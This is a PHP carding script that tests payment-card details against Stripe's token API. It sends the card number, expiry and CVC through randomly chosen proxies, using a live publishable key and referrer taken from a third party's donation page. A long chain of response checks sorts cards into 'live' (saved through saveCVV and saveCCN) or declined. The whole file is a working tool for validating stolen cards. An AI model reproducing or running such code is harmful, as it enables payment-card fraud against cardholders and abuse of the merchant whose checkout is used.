<?php
//                                                       Testing Curl :)
require_once './libs/Curl/CurlX.php';
require './libs/Curl/Function/getstr.php';
require './libs/Curl/Function/instr.php';
require './libs/Curl/Function/value.php';
require './libs/Curl/Function/divider.php';
require './libs/Curl/Function/Array.php';
require './libs/Curl/Function/saveCCN.php';
require './libs/Curl/Function/saveCVV.php';
require './libs/Curl/Function/r-error.php';
require './libs/Curl/Function/bin.php';
require './libs/Curl/Function/r_method.php';
require './libs/Curl/Function/multicurl_getcontent.php';
include './libs/init.php';

$requests = new CurlX;

#====================== [ GET PROXY RESPONSE FOR CURL CLASS ] =====================#
$proxy = array('type' => 'proxy','proxy' => $requests::randProxy());
$requests::get("https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=300&country=all", $proxy);

#====================== [ POST REQUEST TO CURL CLASS ] =====================#
$requests::post('url', 'data', ('headers') , 'proxy');
$header = array(
    'accept: application/json',
    'accept-encoding: gzip, deflate, br',
    'accept-language: en',
    'content-type: application/x-www-form-urlencoded',
    'dnt: 1',
    'origin: https://checkout.stripe.com',
    'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=013d23cf-2ba6-7bb3-cf9b-d3f3997020c4',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site');
$response = $requests->post(
    $url = "https://api.stripe.com/v1/tokens", 
    $data = 'email=nba2k'.$cvv.'gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fdrewdevault.com%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&card[cvc]='.$cvv.'&card[name]=nba2k'.$cvv.'gmail.com&time_on_page=29558&guid=e437c101-7398-4a61-a48e-03e77abc2433&muid=e6e0b7c5-1348-4899-90af-f91744a77a40&sid=51d68086-911a-4631-a227-422ccab4f918&key=pk_live_OM0qvl65Vc0PLMxYKvE7QBIF', $header);
#============================ [ API RESULT ] ================================#
if (strpos($response, 'Success'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Successfully subscribed'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Payment Complete: Thank you for your donation.'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match 🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Payment Complete'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Thank You.'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, '"result":"success"'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Your card zip code is incorrect.'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>Incorrect zip /AVS  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, '"status":"complete"'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Thanks'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Thank You For Your Donation.'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, '"cvc_check": "pass"'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match 🐋 Dexter🐋 </i></font><br>";
}
else if (strpos($response, '"status": "succeeded"'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, '"success": "true"'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'succeeded'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV: Match  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'Your card has insufficient funds.'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>Insufficient funds  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'pickup_card'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>Pickup Card  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, 'balance_insufficient'))
{
    saveCVV("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ♛<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='green'><font class='badge badge-success'>Insufficient Balance  🐋 Dexter🐋</i></font><br>";
}
else if (strpos($response, "Your card's security code is incorrect."))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, "The card's security code is incorrect."))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, 'invalid_cvc'))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, '"cvc_check": "fail"'))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, 'incorrect_cvc'))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, 'Card Issuer Declined CVV'))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>Card Issuer Declined CVV</i></font><br>";
}
else if (strpos($response, "CVC Declined"))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, "The Elavon bank number or terminal ID is incorrect."))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, "Your card's security code is invalid."))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, "incorrect_pin"))
{
    saveCCN("$cc|$mm|$yy|$cvv");
    echo "<font size=2 color='white'><font class='badge badge-light'>Reprovada 💦<class='zmdi zmdi-check'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='white'><font class='badge badge-light'>✘ Live CCN ✘</i></font><br>";
}
else if (strpos($response, 'stolen_card'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Stolen Card</i></font><br>";
}
else if (strpos($response, 'Do Not Honour'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Do Not Honour</i></font><br>";
}
else if (strpos($response, 'Restricted Card'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Restricted Card</i></font><br>";
}
else if (strpos($response, 'Invalid credit card number.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Invalid credit card number.</i></font><br>";
}
else if (strpos($response, 'transaction_not_allowed'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Transaction Not Allowed</i></font><br>";
}
else if (strpos($response, 'incorrect_number'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card number is incorrect.</i></font><br>";
}
else if (strpos($response, 'status":"nok'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card was declined.</i></font><br>";
}
else if (strpos($response, 'invalid_number'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card number is incorrect.</i></font><br>";
}
else if (strpos($response, 'Failed to process donation.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Failed to process donation.</i></font><br>";
}
else if (strpos($response, 'do_not_honor'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Do Not Honor</i></font><br>";
}
else if (strpos($response, 'Your card number is incorrect.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card number is incorrect.</i></font><br>";
}
else if (strpos($response, 'lost_card'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Lost Card</i></font><br>";
}
else if (strpos($response, 'expired_card'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Expired Card</i></font><br>";
}
else if (strpos($response, 'Your card does not support this type of purchase.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card does not support this type of purchase.</i></font><br>";
}
else if (strpos($response, '"cvc_check": "unchecked"'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Card_Checked : unchecked</i></font><br>";
}
else if (strpos($response, '"cvc_check": "unavailable'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Card_Checked : unavailable</i></font><br>";
}
else if (strpos($response, 'generic_decline'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Generic Decline</i></font><br>";
}
else if (strpos($response, 'The transaction was declined.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>The transaction was declined.</i></font><br>";
}
else if (strpos($response, 'zip code is incorrect.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Your card's zip code is incorrect.</i></font><br>";
}
else if (strpos($response, 'The card has expired.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Expired Card</i></font><br>";
}
else if (strpos($response, 'This transaction has been declined'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>This transaction has been declined</i></font><br>";
}
else if (strpos($response, 'An error occurred while processing your card. Try again in a little bit.'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>An error occurred while processing your card. Try again in a little bit.</i></font><br>";
}
else if (strpos($response, 'Refer to Card Issuer'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Refer to Card Issuer</i></font><br>";
}
else if (strpos($response, 'invalid_account'))
{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Invalid Stripe Key</i></font><br>";
}
else {
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada 💦<class='zmdi zmdi-close'></i></font> $cc|$mm|$yy|$cvv <font size=2 color='red'><font class='badge badge-danger'>Authorized: Failed</i></font><br>";
}
//echo "[ ";
//echo json_encode($response);
//echo " ]<br>";
?>